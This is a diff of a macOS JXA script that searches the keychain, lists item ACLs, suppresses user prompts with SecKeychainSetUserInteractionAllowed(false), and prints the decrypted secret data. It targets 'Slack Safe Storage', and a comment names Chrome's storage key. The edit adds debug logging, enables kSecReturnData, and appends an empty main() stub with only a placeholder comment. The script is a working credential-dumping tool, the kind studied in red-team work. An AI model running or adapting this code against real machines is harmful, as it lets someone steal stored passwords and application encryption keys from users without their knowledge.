@@ -1,171 +1,186 @@
 ObjC.import("Security");
 ObjC.bindFunction('CFMakeCollectable', ['id', ['void *'] ]);
 
+let DEBUG = true;
+
+function debug(message) {
+    if (DEBUG) {
+        console.log("[DEBUG] " + message);
+    }
+}
+
 function hex2a(hexx) {
-	var hex = hexx.toString();//force conversion
-	var str = '';
-	for (var i = 0; i < hex.length; i += 2)
-	    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
-	return str;
+    debug("Entering hex2a function");
+    var hex = hexx.toString();//force conversion
+    var str = '';
+    for (var i = 0; i < hex.length; i += 2)
+        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+    debug("Exiting hex2a function");
+    return str;
 }
 
 print_acls = function(accessRights, acl_c, range, keychainItem){
-	let userId = Ref();
-	let groupId = Ref();
-	let ownerType = Ref();
-	let ownerACLS = Ref();
-	$.SecAccessCopyOwnerAndACL(accessRights, userId, groupId, ownerType, ownerACLS);
-	if(ownerType[0] !== 0){
-		console.log("userid: " + userId[0] + "\ngroupid: " + groupId[0] + "\nownertype: " + ownerType[0]);
-	} else {
-		console.log("\tOwnership determined by partitionID");
-	}
-	auth_c = $.CFMakeCollectable(ownerACLS[0]);
-	if(auth_c.js !== undefined){
-		console.log("Owner Authorizations:");
-		for(let j = 0; j < parseInt($.CFArrayGetCount(auth_c)); j++){
-			authz = auth_c.objectAtIndex(j);
-			console.log("\t" + authz.js);
-		}
-	}else{
-		console.log("\tNo Authorizations")
-	}
-	let hasNecessaryPartitionIDs = false;
-    let hasPartitionIDSet = false;
-    let hasNecessaryAuthorizationsAndIsTrustedApplication = false;
-    let hasNecessaryAuthorizationsAndAllApplicationsTrusted = false;
-    if(range === 0){
-    	hasNecessaryPartitionIDs = true;
-    	hasPartitionIDSet = true;
-    	hasNecessaryAuthorizationsAndIsTrustedApplication = true;
-    	hasNecessaryAuthorizationsAndAllApplicationsTrusted = true;
+    debug("Entering print_acls function");
+    let userId = Ref();
+    let groupId = Ref();
+    let ownerType = Ref();
+    let ownerACLS = Ref();
+    
+    let status = $.SecAccessCopyOwnerAndACL(accessRights, userId, groupId, ownerType, ownerACLS);
+    if (status !== 0) {
+        console.log("Failed to copy owner and ACL. Error: " + status);
+        return;
     }
-	for(let i = 0; i < range; i++){
-		let perACLIsTrustedApplication = false;
-        let perACLHasNecessaryAuthorizations = false;
-        let perACLAllApplicationsTrusted = false;
-		let acl1 = acl_c.objectAtIndex(i);
-		let application_list = Ref();
-		let description = Ref();
-		let keychainPromptSelector = Ref();
-		$.SecACLCopyContents(acl1, application_list, description, keychainPromptSelector);
-		description_c = $.CFMakeCollectable(description[0]); // $("Chrome Safe Storage")
-		console.log("---------------------------------------------------");
-		if(description_c.js.startsWith("3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d225554462d38223f3e0a")){
-			// we're looking at the PartitionID PLIST
-			// 3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d225554462d38223f3e0a
-            // is "<?xml version="1.0" encoding="UTF-8"?>" which means we're looking at a plist for the description
-            let plistString = hex2a(description_c.js);
-            let format = $.NSPropertyListXMLFormat_v1_0;
-            let partitionPlist = $.NSPropertyListSerialization.propertyListWithDataOptionsFormatError($(plistString).dataUsingEncoding($.NSUTF8StringEncoding), $.NSPropertyListImutable, $.NSPropertyListXMLFormat_v1_0, $.nil);
-            if(partitionPlist.objectForKey("Partitions")){
-            	let partitions = ObjC.deepUnwrap(partitionPlist.objectForKey("Partitions"));
-            	console.log("\tAllowed Code Signatures: ", partitions);
-            	
-            }
-		}
-		console.log("\tDescription of ACL: " + description_c.js);
-		application_list_c = $.CFMakeCollectable(application_list[0]);
-		if(application_list_c.js !== undefined){
-			let app_list_length = parseInt($.CFArrayGetCount(application_list_c));
-			if(app_list_length === 0){
-				console.log("\tNo trusted applications");
-			}
-			for(let j = 0; j < app_list_length; j++){
-				secapp = application_list_c.objectAtIndex(j);
-				secapp_c = Ref();
-				$.SecTrustedApplicationCopyData(secapp, secapp_c);
-				secapp_data = $.CFMakeCollectable(secapp_c[0]);
-				sec_string = $.NSString.alloc.initWithDataEncoding( $.NSData.dataWithBytesLength(secapp_data.bytes, secapp_data.length), $.NSUTF8StringEncoding);
-				console.log("\tTrusted App: " + sec_string.js);
-			}
-		} else {
-			console.log("\tAll applications trusted");
-		}
-		auth = $.SecACLCopyAuthorizations(acl1);
-		auth_c = $.CFMakeCollectable(auth);
-		if(auth_c.js !== undefined){
-			console.log("\tAuthorizations:");
-			for(let j = 0; j < parseInt($.CFArrayGetCount(auth_c)); j++){
-				authz = auth_c.objectAtIndex(j);
-				console.log("\t\t" + authz.js);
-				//if( (authz.js.includes("ACLAuthorizationExportClear") || authz.js.includes("ACLAuthorizationAny") ) && application_list_c.js === undefined){
-				if( authz.js.includes("ACLAuthorizationExportClear") || authz.js.includes("ACLAuthorizationAny")){
-					//console.log("\t\tApplication list is nil and there is authorization to export");
-					perACLHasNecessaryAuthorizations = true;
-				}
-			}
-		}else{
-			console.log("\t\tNo Authorizations")
-		}
-		
-	}
-	$.SecKeychainSetUserInteractionAllowed(false);
-	if(true){
-		print_password(keychainItem);
-	}
-}
-print_password = function(keychainItem){
-	let dataContent = Ref();
-	let dataContentLength = Ref();
-	let attributeList = Ref();
-	status = $.SecKeychainItemCopyContent(keychainItem, 0, attributeList, dataContentLength, dataContent);
-	//console.log(status);
-	//console.log(dataContentLength[0]);
-	if(status === 0){
-		let nsdata = $.NSData.alloc.initWithBytesLength(dataContent[0], dataContentLength[0]);
-		//console.log("\t\t[++++++++] SECRET DATA HERE [++++++++++]")
-		//console.log("Base64 of secret data: " + nsdata.base64EncodedStringWithOptions(0).js);
-		console.log("Secret Data: ", $.NSString.alloc.initWithDataEncoding(nsdata, $.NSUTF8StringEncoding).js);
-	}else if(status === -25293){
-		console.log("Failed to get password - Invalid Username/Password");
-	} else {
-		console.log("Failed to decrypt with error: " + status);
-	}
-}
-process_query = function(query){
-	let items = Ref();
-	let status = $.SecItemCopyMatching(query, items);
-	if(status === 0){
-		let item_o_c = $.CFMakeCollectable(items[0]).js;
-		console.log("[+] Successfully searched, found " + item_o_c.length + " items")
-		for(let i = 0; i < item_o_c.length; i++){
-			let item = item_o_c[i];
-			//$.CFShow(item);
-			console.log("==================================================");
-			console.log("Account:     " + item.objectForKey("acct").js);
-			console.log("Create Date: " + item.objectForKey("cdat").js);
-			//console.log(item.objectForKey("gena").js);
-			console.log("Label:       " + item.objectForKey("labl").js);
-			console.log("Modify Date: " + item.objectForKey("mdat").js);
-			console.log("Service:     " + item.objectForKey("svce").js);
-			console.log("KeyClass:    " + item.objectForKey("class").js);
-			if( item.objectForKey("gena").js !== undefined){
-				console.log("General:     " + item.objectForKey("gena").base64EncodedStringWithOptions(0).js);
-			}
 
-			let access_rights2 = Ref();
-			$.SecKeychainItemCopyAccess(item.objectForKey("v_Ref"), access_rights2);
-			let acl2 = Ref()
-			$.SecAccessCopyACLList(access_rights2[0], acl2)
-			range2 = parseInt($.CFArrayGetCount(acl2[0]));
-			acl_c2 = $.CFMakeCollectable(acl2[0]);
-			print_acls(access_rights2[0], acl_c2, range2, item.objectForKey("v_Ref"));
-			// we can get the data and try to decrypt below
-			//let dataContent = Ref();
-			//let dataContentLength = Ref();
-			//let attributeList = Ref();
-			//status = $.SecKeychainItemCopyContent(item_o_c, 0, attributeList, dataContentLength, dataContent);
-			//console.log(status);
-			//console.log(dataContentLength[0]);
-			//let nsdata = $.NSData.alloc.initWithBytesLength(dataContent[0], dataContentLength[0]);
-			//console.log(nsdata.base64EncodedStringWithOptions(0).js);
-		}
-		
-	}else{
-		console.log("[-] Failed to search keychain with error: " + status);
-	}
+    if(ownerType[0] !== 0){
+        console.log("userid: " + userId[0] + "\ngroupid: " + groupId[0] + "\nownertype: " + ownerType[0]);
+    } else {
+        console.log("\tOwnership determined by partitionID");
+    }
+    
+    let auth_c = $.CFMakeCollectable(ownerACLS[0]);
+    if(auth_c && typeof auth_c.js !== 'undefined'){
+        console.log("Owner Authorizations:");
+        let authCount = $.CFArrayGetCount(auth_c);
+        for(let j = 0; j < authCount; j++){
+            let authz = auth_c.objectAtIndex(j);
+            console.log("\t" + ObjC.unwrap(authz));
+        }
+    } else {
+        console.log("\tNo Authorizations");
+    }
+    
+    for(let i = 0; i < range; i++){
+        let acl1 = acl_c.objectAtIndex(i);
+        let application_list = Ref();
+        let description = Ref();
+        let keychainPromptSelector = Ref();
+        
+        status = $.SecACLCopyContents(acl1, application_list, description, keychainPromptSelector);
+        if (status !== 0) {
+            console.log("Failed to copy ACL contents. Error: " + status);
+            continue;
+        }
+
+        let description_c = $.CFMakeCollectable(description[0]);
+        console.log("---------------------------------------------------");
+        console.log("\tDescription of ACL: " + ObjC.unwrap(description_c));
+        
+        let application_list_c = $.CFMakeCollectable(application_list[0]);
+        if(application_list_c && typeof application_list_c.js !== 'undefined'){
+            let app_list_length = $.CFArrayGetCount(application_list_c);
+            if(app_list_length === 0){
+                console.log("\tNo trusted applications");
+            } else {
+                for(let j = 0; j < app_list_length; j++){
+                    let secapp = application_list_c.objectAtIndex(j);
+                    let secapp_c = Ref();
+                    status = $.SecTrustedApplicationCopyData(secapp, secapp_c);
+                    if (status !== 0) {
+                        console.log("Failed to copy trusted application data. Error: " + status);
+                        continue;
+                    }
+                    let secapp_data = $.CFMakeCollectable(secapp_c[0]);
+                    let sec_string = $.NSString.alloc.initWithDataEncoding(
+                        $.NSData.dataWithBytesLength(secapp_data.bytes, secapp_data.length),
+                        $.NSUTF8StringEncoding
+                    );
+                    console.log("\tTrusted App: " + ObjC.unwrap(sec_string));
+                }
+            }
+        } else {
+            console.log("\tAll applications trusted");
+        }
+        
+        let auth = $.SecACLCopyAuthorizations(acl1);
+        let auth_c = $.CFMakeCollectable(auth);
+        if(auth_c && typeof auth_c.js !== 'undefined'){
+            console.log("\tAuthorizations:");
+            let authCount = $.CFArrayGetCount(auth_c);
+            for(let j = 0; j < authCount; j++){
+                let authz = auth_c.objectAtIndex(j);
+                console.log("\t\t" + ObjC.unwrap(authz));
+            }
+        } else {
+            console.log("\t\tNo Authorizations");
+        }
+    }
+    
+    $.SecKeychainSetUserInteractionAllowed(false);
+    print_password(keychainItem);
+    
+    debug("Exiting print_acls function");
 }
+
+print_password = function(keychainItem){
+    debug("Entering print_password function");
+    let dataContent = Ref();
+    let dataContentLength = Ref();
+    let attributeList = Ref();
+    status = $.SecKeychainItemCopyContent(keychainItem, 0, attributeList, dataContentLength, dataContent);
+    //console.log(status);
+    //console.log(dataContentLength[0]);
+    if(status === 0){
+        let nsdata = $.NSData.alloc.initWithBytesLength(dataContent[0], dataContentLength[0]);
+        //console.log("\t\t[++++++++] SECRET DATA HERE [++++++++++]")
+        //console.log("Base64 of secret data: " + nsdata.base64EncodedStringWithOptions(0).js);
+        console.log("Secret Data: ", $.NSString.alloc.initWithDataEncoding(nsdata, $.NSUTF8StringEncoding).js);
+    }else if(status === -25293){
+        console.log("Failed to get password - Invalid Username/Password");
+    } else {
+        console.log("Failed to decrypt with error: " + status);
+    }
+    debug("Exiting print_password function");
+}
+
+process_query = function(query){
+    debug("Entering process_query function");
+    debug("Query contents: " + ObjC.deepUnwrap(query));
+    
+    let items = Ref();
+    debug("Created items Ref");
+    
+    let status = $.SecItemCopyMatching(query, items);
+    debug("SecItemCopyMatching status: " + status);
+    
+    if(status === 0){
+        let item_array = ObjC.deepUnwrap($.CFMakeCollectable(items[0]));
+        debug("item_array type: " + typeof item_array);
+        console.log("[+] Successfully searched, found " + item_array.length + " items")
+        for(let i = 0; i < item_array.length; i++){
+            debug("Processing item " + (i + 1));
+            let item = item_array[i];
+            debug("Item keys: " + Object.keys(item).join(", "));
+            
+            let access_rights2 = Ref();
+            debug("Created access_rights2 Ref");
+            debug("Calling SecKeychainItemCopyAccess");
+            let copyAccessStatus = $.SecKeychainItemCopyAccess(item.objectForKey("v_Ref"), access_rights2);
+            debug("SecKeychainItemCopyAccess status: " + copyAccessStatus);
+            
+            if (copyAccessStatus === 0) {
+                let acl2 = Ref();
+                debug("Created acl2 Ref");
+                debug("Calling SecAccessCopyACLList");
+                let copyACLStatus = $.SecAccessCopyACLList(access_rights2[0], acl2);
+                debug("SecAccessCopyACLList status: " + copyACLStatus);
+                
+                if (copyACLStatus === 0) {
+                    let range2 = $.CFArrayGetCount(acl2[0]);
+                    debug("ACL count: " + range2);
+                    let acl_c2 = $.CFMakeCollectable(acl2[0]);
+                    debug("ACL CFMakeCollectable result type: " + typeof acl_c2);
+                    
+                    print_acls(access_rights2[0], acl_c2, range2, item.objectForKey("v_Ref"));
+                }
+            }
+        }
+    } else {
+        console.log("[-] Failed to search keychain with error: " + status);
+    }
+    debug("Exiting process_query function");
+}
+
 list_all_key_of_type = function(key_type){
 	let items = Ref();
 	let query = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
@@ -173,9 +188,10 @@ list_all_key_of_type = function(key_type){
 	$.CFDictionarySetValue(query, $.kSecMatchLimit, $.kSecMatchLimitAll);
 	$.CFDictionarySetValue(query, $.kSecReturnAttributes, $.kCFBooleanTrue);
 	$.CFDictionarySetValue(query, $.kSecReturnRef, $.kCFBooleanTrue);
-	//$.CFDictionarySetValue(query, $.kSecReturnData, $.kCFBooleanTrue);
+	$.CFDictionarySetValue(query, $.kSecReturnData, $.kCFBooleanTrue);
 	process_query(query);
 }
+
 list_all_attr_of_key_by_account = function(account){
 	let items = Ref();
 	let query = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
@@ -187,6 +203,7 @@ list_all_attr_of_key_by_account = function(account){
 	$.CFDictionarySetValue(query, $.kSecReturnRef, $.kCFBooleanTrue);
 	process_query(query);
 }
+
 list_all_attr_of_key_by_label_genp = function(label){
 	let items = Ref();
 	let query = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
@@ -198,6 +215,7 @@ list_all_attr_of_key_by_label_genp = function(label){
 	$.CFDictionarySetValue(query, $.kSecReturnRef, $.kCFBooleanTrue);
 	process_query(query);
 }
+
 list_all_attr_of_key_by_label_key = function(label){
 	let items = Ref();
 	let query = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
@@ -209,9 +227,18 @@ list_all_attr_of_key_by_label_key = function(label){
 	$.CFDictionarySetValue(query, $.kSecReturnRef, $.kCFBooleanTrue);
 	process_query(query);
 }
+
 //list_all_key_of_type($.kSecClassGenericPassword);
 //list_all_key_of_type($.kSecClassKey);
 //list_all_key_of_type($.kSecClassInternetPassword);
 //list_all_key_of_type($.kSecClassCertificate);
 //list_all_attr_of_key_by_account("test account");
 list_all_attr_of_key_by_label_genp("Slack Safe Storage");
+
+function main() {
+    debug("Entering main function");
+    // ... (rest of the main function)
+    debug("Exiting main function");
+}
+
+main();
